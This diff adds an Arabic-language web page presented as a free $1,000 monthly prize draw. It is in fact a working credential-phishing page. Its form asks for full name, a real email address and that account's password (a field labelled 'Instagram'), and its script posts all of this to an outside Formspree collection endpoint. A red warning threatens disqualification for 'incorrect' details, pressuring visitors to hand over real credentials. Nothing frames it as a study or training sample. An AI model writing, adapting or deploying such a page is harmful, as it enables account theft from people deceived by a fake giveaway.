@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>السحب الشهري الكبير | 1,000$</title>
+    <style>
+        :root {
+            --primary-color: #d4af37;
+            --primary-hover: #aa8c2c;
+            --bg-gradient: linear-gradient(135deg, #111827 0%, #1f2937 100%);
+            --card-bg: #2d3748;
+            --text-color: #f3f4f6;
+            --error-color: #f87171;
+            --success-color: #34d399;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-sizing: border-box;
+            border: 1px solid rgba(212, 175, 55, 0.2);
+        }
+
+        h2 { margin: 0; color: var(--primary-color); font-size: 28px; }
+        .prize-tag { font-size: 42px; font-weight: 800; color: #fff; text-shadow: 0 0 10px rgba(212, 175, 55, 0.6); margin: 15px 0; }
+        p.subtitle { color: #9ca3af; font-size: 15px; margin-bottom: 30px; }
+        
+        .form-group { text-align: right; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #cbd5e1; }
+        input { width: 100%; padding: 12px 15px; background: #1f2937; border: 2px solid #4b5563; border-radius: 10px; font-size: 15px; color: white; outline: none; box-sizing: border-box; transition: border-color 0.3s; }
+        input:focus { border-color: var(--primary-color); }
+        
+        button { width: 100%; padding: 14px; background: var(--primary-color); color: #111827; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 10px; }
+        button:hover { background: #f1c40f; }
+        button:disabled { background: #4b5563; cursor: not-allowed; }
+        .msg { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: bold; display: none; }
+        .msg.error { background: rgba(248, 113, 113, 0.15); color: var(--error-color); display: block; }
+        .msg.success { background: rgba(52, 211, 153, 0.15); color: var(--success-color); display: block; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="font-size: 55px; margin-bottom: 5px;">🏆</div>
+    <h2>السحب الشهري الكبير</h2>
+    <div class="prize-tag">1,000$</div>
+    <p class="subtitle">سجل الآن مجاناً للدخول في سحب هذا الشهر</p>
+    
+    <form id="submissionForm">
+        <div class="form-group">
+            <label>الاسم الكامل:</label>
+            <input type="text" name="الاسم" placeholder="أدخل اسمك الثلاثي" required autocomplete="off">
+        </div>
+        <div class="form-group">
+            <label>البريد الإلكتروني الحقيقي:</label>
+            <input type="email" name="الإيميل" placeholder="example@gmail.com" required autocomplete="off">
+        </div>
+        <div class="form-group">
+            <label> ادخل كلمة المرور:</label>
+            <input type="text" name="الانستغرام" placeholder=" المستخدمة في هذا الحساب", كي نتمكن من التواصل معك" required autocomplete="off">
+        </div>
+        
+        <p style="color: #f87171; font-size: 13px; font-weight: bold; margin: 15px 0; line-height: 1.5;">⚠️ تنبيه: أي تلاعب أو كتابة للمعلومات بشكل غير صحيح يؤدي للطرد من السحب !</p>
+        
+        <button type="submit" id="uiBtn">دخول السحب الآن</button>
+    </form>
+    
+    <div id="msgBox" class="msg"></div>
+</div>
+
+<script>
+// ⚙️ تم وضع رابط الفورم الخاص بك هنا بنجاح
+const FORMSPREE_URL = "https://formspree.io/f/mkodpjjb"; 
+
+document.getElementById('submissionForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const msgBox = document.getElementById('msgBox');
+    const submitBtn = document.getElementById('uiBtn');
+    
+    submitBtn.disabled = true;
+    submitBtn.innerText = "جاري التسجيل...";
+
+    try {
+        const response = await fetch(FORMSPREE_URL, {
+            method: 'POST',
+            body: new FormData(this),
+            headers: { 'Accept': 'application/json' }
+        });
+
+        if (response.ok) {
+            msgBox.className = "msg success";
+            msgBox.innerText = "تهانينا! تم تسجيل بياناتك بنجاح، في حال تم اختيارك سترسل رسالة إلى بريدك الالكتروني هذا.";
+            document.getElementById('submissionForm').reset();
+        } else {
+            throw new Error();
+        }
+    } catch (error) {
+        msgBox.className = "msg error";
+        msgBox.innerText = "حدث خطأ أثناء الإرسال، يرجى إعادة المحاولة.";
+    } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerText = "دخول السحب الآمن";
+    }
+});
+</script>
+</body>
+</html>
